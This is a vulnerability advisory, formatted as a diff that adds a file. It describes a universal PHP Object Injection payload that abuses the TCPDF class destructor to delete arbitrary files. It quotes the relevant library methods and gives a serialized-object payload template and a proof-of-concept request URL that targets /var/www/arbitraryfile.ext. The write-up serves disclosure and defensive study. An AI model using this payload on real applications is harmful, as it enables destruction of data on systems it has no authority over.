@@ -1,0 +1,84 @@
+TCPDF library Universal POI Payload to Arbitrary File Deletion
+
+[+] Author: Filippo Roncari
+[+] Target: TCPDF library
+[+] Version: <= 5.9 and probably others [tested on v5.9]
+[+] Vendor: http://www.tcpdf.org
+[+] Accessibility: Remote
+[+] Severity: High
+[+] CVE: n/a
+[+] Advisory URL: n/a
+[+] Contacts: f.roncari@securenetwork.it / f@unsec.it
+
+
+[+] Summary
+TCPDF library is one of the world's most used open source PHP libraries, included in thousands of CMS and Web applications worldwide. More information at: http://en.wikipedia.org/wiki/TCPDF. A universal Object Injection payload for vulnerable PHP applications, which make use of TCPDF library, is here shared.
+
+
+[+] Exploit Details
+The identified payload allows to exploit any POI vulnerable web application that uses unserialize() on not sanitized user input in a point from which the Tcpdf class is loadable. The payload abuses the __destruct() magic method of the Tcpdf class defined in tcpdf.php and allows to arbitrary delete files on the filesystem.
+
+
+[+] Technical Details
+Tcpdf.php contains the Tcpdf class definition. The __destruct() method, at least up to version 5.9 (and possibly others), is implemented as follows. 
+
+
+	[!] Method __destruct() in tcpdf.php
+	-------------------------
+	public function __destruct() {
+		// restore internal encoding
+		if (isset($this->internal_encoding) AND !empty($this->internal_encoding)) {
+			mb_internal_encoding($this->internal_encoding);
+		}
+		// unset all class variables
+		$this->_destroy(true);
+	}
+	-------------------------
+
+As you can see, the main action performed by __destruct() is the invocation of the inner _destroy() method, which, along with other things, calls the unlink() function on the internal object buffer. 
+
+
+	[!] Method _destroy() in tcpdf.php
+	-------------------------
+	public function _destroy($destroyall=false, $preserve_objcopy=false) {
+
+		if ($destroyall AND isset($this->diskcache) AND $this->diskcache AND (!$preserve_objcopy) AND (!$this->empty_string($this->buffer))) {
+			unlink($this->buffer);
+		}
+
+		[...]
+
+	}
+	-------------------------
+
+For a better understanding of the payload, you should know that $buffer is defined as a protected property of the Tcpdf object, which means significant differences in serialization compared to normal properties. 
+
+
+	[!] $buffer in tcpdf.php
+	-------------------------
+	/**
+	 * @var buffer holding in-memory PDF
+	 * @access protected
+	 */
+	protected $buffer;
+	-------------------------
+
+
+[+] Proof of Concept (PoC) 
+In view of the above, the payload consists of a serialized Tcpdf object with two protected properties set: buffer and diskcache. The first will contain the path to the arbitrary file to delete, while diskcache is a boolean property set to true, necessary to enter the _destroy() inner if branch, in order to reach the unlink() call. A particular attention must be addressed to the null-bytes surrounding the asterisks before the property names. This is the way (crazy, I know) in which PHP serializes protected object properties. An incorrect conversion of the null-bytes during payload injection will result in the exploit failure.
+
+	[!] Payload
+	-------------------------
+	O:5:"TCPDF":2:{s:9:"%00*%00buffer";s:[PATH_LENGTH]:"[FILE_PATH_TO_DELETE]";s:12:"%00*%00diskcache";b:1;}
+	-------------------------
+
+
+	[!] Generic PoC Exploit
+	-------------------------
+	http://vulnerablesite.com/vulnerable_page.php?vulnearble_par=O:5:"TCPDF":2:{s:9:"%00*%00buffer";s:26:"/var/www/arbitraryfile.ext";s:12:"%00*%00diskcache";b:1;}
+	-------------------------
+
+
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this alert, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
